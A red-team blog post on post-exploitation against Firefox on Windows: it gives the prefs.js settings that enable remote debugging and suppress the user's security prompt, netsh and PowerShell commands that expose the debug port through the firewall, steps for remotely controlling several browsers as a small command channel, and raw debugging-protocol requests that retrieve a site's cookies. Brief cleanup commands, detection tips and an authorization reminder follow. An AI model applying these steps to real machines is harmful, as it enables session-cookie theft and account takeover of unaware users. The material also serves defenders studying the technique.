---
title: "Post-Exploitation: Remote controlling Firefox and accessing cookies"
date: 2020-04-21T18:18:51-07:00
draft: true
---

Previously we have discussed how to enable remote debugging on Chrome, and how to connect to it and inspect sessions during post-exploitation. The main goal for red teamers to do this typically to gain access to authentication tokens. 
Today, let's discuss how remote debugging works with Firefox. 

Unlike Chrome, Firefox disables this feature by default.

So first, during post-exploitation one has to enable it accordingly by updated the user.js file (or prefs.js).

<UPDATE>
$AppData\Roaming\Mozilla\Firefox\Profiles\6yo6s4cs.default-release\prefs.js

These are the updates that are required:

```
user_pref("devtools.chrome.enabled", true);
user_pref("devtools.debugger.remote-enabled", true);
user_pref("devtools.debugger.prompt-connection", false);
```

This will enable the remote debugging features, and also disable any security prompts the user would normally see by default.

You can find the corresponding settings under Development Settings:
    ![Security Settings](/blog/images/2020/firefox.debug.settings.png)

And this is how the security prompt would look like that we disabled:
    ![Security Prompt](/blog/images/2020/firefox.debugger.permission.png)


After that we can launch a new instance of Firefox using:

``` & 'C:\Program Files\Mozilla Firefox\firefox.exe' -start-debugger-server 9222 ```

There are also the options for ```--headless``` and so forth that you can experiment around with.

This is how it looks like:

![PowerShell run Firefox with remote debugging](/blog/images/2020/firefox.debugger.running.png)

As you can see, this only listens on the local interface.

### Tunneling traffic to the attacker

The debugging port is only available locally now, an adversary will try to make that remotely accessible via port forwarding. 

**Important: This traffic is sent in clear text, so be aaware and consider using ssh port forwarding to encrypt traffic. This example is for research purposes.**

In Windows, this can be done by an Administrator using the ```netsh interface portproxy``` command. 

The following command shows how this is performed:

```netsh interface portproxy add v4tov4 listenaddress=0.0.0.0 listenport=48333 connectaddress=127.0.0.1 connectport=9222``` 

Now, remote connections to this port will not be allowed because the firewall blocks them (we forwarded to port 48333). We have to add a new firewall rule to allow port 48333. So, let's allow that port through the firewall. 

There are multiple ways to do this on Windows (we focus on Window now, but all this should also work on macOS and Linux):

1. Use netsh to add a new firewall rule:

    ```netsh advfirewall firewall add rule name="Open Port 48333" dir=in action=allow protocol=TCP localport=48333```
2. On modern Windows machines, this can also be done via PowerShell commands:

    ``` New-NetFirewallRule -Name FirefoxRemote -DisplayName "Open Port 48333" -Direction Inbound -Protocol tcp -LocalPort 48333 -Action Allow -Enabled True     ``` 

Now, it is all setup to connect to from another machine.

## Debugging remote Firefox instances

Now that we have the debugging port exposed remotely, we can attach Firefox on our "attack" machine to it. Let's walk through the steps on how this works:

1. Navigate to about:debugging in the browser URL (or click Web Developer Tools - Remote Debugger). This is where you can connect to remote devices runnning Firefox. Click "Add" to add a new server to connect to.

    ![Adding a new remote server](/blog/images/2020/firefox.debugger.remoteadd.png)

2. It is also possible to add  multiple debug server as seen in this screenshot. This basically allows to have a mini C2 to remote control multiple browsers. 

    ![Connecting to multiple debug servers](/blog/images/2020/firefox.debug.connect.multiple.png)

3. Use the ```Connect``` button to connect to a particular browser instance. Once connected you can run commands in the console, navigate the user to a different page, and also inspect storage and cookies as seen in the following screenshot.

    ![Inspecting Cookies remotely](/blog/images/2020/firefox.debugger.remotecookies.png)

That's it, all pretty cool I think :)

## Automating retrieval of cookies

I have not yet spent much time to research the protocol to script automatic retrieval of cookies. 

The protocol is documented [here](https://docs.firefox-dev.tools/backend/protocol.html).

And soon there will be a Firefox API Network.getAllCookies()  (LINK here to Bugzilla entry) that will make this very easy - similar to how it works today in Chrome via Cooke Crimes.

The default protocol is a simple one, it consists of sending ```length:JSONREQUEST```.

Connect via telnet or netcat, and send the following strings in:

``` 30:{"type":"getRoot","to":"root"} ```

These steps are what I needed to retrieve cookies from a particular site:

```
31:{"to":"root","type":"listTabs"}
57:{"type":"getTarget","to":"server1.conn21.tabDescriptor7"}
65:{"type":"listStores","to":"server1.conn21.child21/storageActor5"}
124:{"type":"getStoreObjects","host":"https://www.google.com","names":null,"options":{},"to":"server1.conn21.child21/cookies20"}
```

The identifiers for connections and actors change everytime, so this needs a little scripting to automate completely, but shouldn't be difficult to do. 


## Cleaning up and reverting changes 

Keep in mind that port forwarding was set up earlier to enable the remote exposure of the Firefox debugging API on port 48333. In order to remove port forwarding and revert to the defaults, we can run  the following command: 

```netsh interface portproxy reset```

Alternatively, there is a delete argument. 

The same applies for opening port 48333. The firewall rule can be removed again using the following command:

``` netsh advfirewall firewall del rule name="Open Port 48333" ```

or if you used the PowerShell example:

``` Remove-NetFirewallRule -Name FirefoxRemote ```


## Detections and Mitigations

* Blue teams should look for anyone using the **-start-debugger-server ** and related features to identify potential misuse. Be aware on Linux/macOS the argument is --start-debugger-server
* Similarly, observe and monitor for port forwarding on hosts

## Red Team Strategies

If you liked this post and found it informative or inspirational, you might be interested in the book ["Cybersecurity Attacks - Red Team Strategies"](https://www.amazon.com/Cybersecurity-Attacks-Strategies-practical-penetration-ebook/dp/B0822G9PTM). It is filled with more ideas, research and fundamental techniques, as well as red teaming program and people mangement aspects.


Hope this was informative and useful. And as always, only perform pentesting with authorization from proper stakeholders. Do not break the law.


## References
* [Firefox Remote Debugging Protocol](https://docs.firefox-dev.tools/backend/protocol.html).
* [MITRE ATT&CK Technique T1539: Steal Web Session Cookie](https://attack.mitre.org/techniques/T1539/)
* [MITRE ATT&CK Technique T1506: Web Session Cookie](https://attack.mitre.org/techniques/T1506/)


